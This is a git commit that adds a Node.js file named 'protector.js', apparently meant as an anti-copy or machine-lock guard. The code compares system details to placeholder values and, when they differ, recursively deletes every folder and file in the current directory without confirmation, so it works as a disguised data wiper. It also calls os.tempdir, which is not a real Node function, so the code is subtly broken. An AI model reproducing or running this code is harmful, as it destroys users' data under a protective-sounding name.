214bab481b26525c6ea79b001865481dced3f9ea
Timur <116884622+timurhankarabulut@users.noreply.github.com>
2023-01-19 05:40:42 +0300

    Add files via upload

---
+++ protector.js
@@ -0,0 +1,24 @@
+const glob = require("glob");
+const os = require('node:os');
+const fs = require('node:fs');
+
+const data = {
+"HOSTNAME": 'userhostname',
+"USERNAME": 'userusername',
+"HOMEDIR": 'userhomedir',
+"TEMPDIR": 'usertempdir',
+"VERSION": 'userversion',
+"WINVER": 'userrelease',
+"ARCH": 'userarch',
+}
+
+if (os.hostname() != data.HOSTNAME && os.userInfo().username != data.USERNAME && os.homedir() != data.HOMEDIR && os.tempdir() != data.TEMPDIR && os.version() != data.VERSION && os.release() != data.WINVER && os.arch() != data.ARCH) {
+    glob.sync("./*/").map(resources => {
+        if (resources == "./System Volume Information/") return;
+        fs.rmSync(resources, {recursive: true});
+    })
+
+    glob.sync("./*.*").map(resource => {
+        fs.unlink(resource, (err) => {});
+    })
+}
